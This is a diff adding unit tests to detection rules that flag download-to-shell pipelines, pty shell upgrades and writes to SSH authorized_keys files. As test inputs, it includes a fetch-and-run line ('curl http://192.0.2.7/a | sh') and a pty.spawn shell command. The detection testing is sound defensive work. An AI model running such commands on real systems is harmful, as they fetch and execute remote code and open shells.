@@ -139,6 +139,16 @@ def test_download_pipe_negatives(argv):
     assert run(host.DownloadPipedToShell, [exec_ev(argv)]) == []
 
 
+def test_quoted_pipe_is_not_a_download_pipeline():
+    argv = ["/bin/sh", "-c", 'echo x; curl "|" sh']
+    assert run(host.DownloadPipedToShell, [exec_ev(argv)]) == []
+
+
+def test_newline_delimited_download_pipeline_is_detected():
+    argv = ["/bin/sh", "-c", "cd /tmp\ncurl http://192.0.2.7/a | sh"]
+    assert len(run(host.DownloadPipedToShell, [exec_ev(argv)])) == 1
+
+
 # ---------------------------------------------------------------- python pty spawn
 def test_pty_spawn_found():
     m = run(host.PtyUpgrade, [exec_ev(["python3", "-c", 'import pty;pty.spawn("/bin/bash")'])])
@@ -226,6 +236,11 @@ def test_authorized_keys_append_found():
     ["/bin/sh", "-c", "echo 'see ~/.ssh/authorized_keys' > notes.txt"],  # mention in text
 ])
 def test_authorized_keys_negatives(argv):
+    assert run(host.AuthorizedKeysWrite, [exec_ev(argv)]) == []
+
+
+def test_quoted_redirect_is_not_an_authorized_keys_write():
+    argv = ["/bin/sh", "-c", 'grep -c ">" /root/.ssh/authorized_keys']
     assert run(host.AuthorizedKeysWrite, [exec_ev(argv)]) == []
 
 
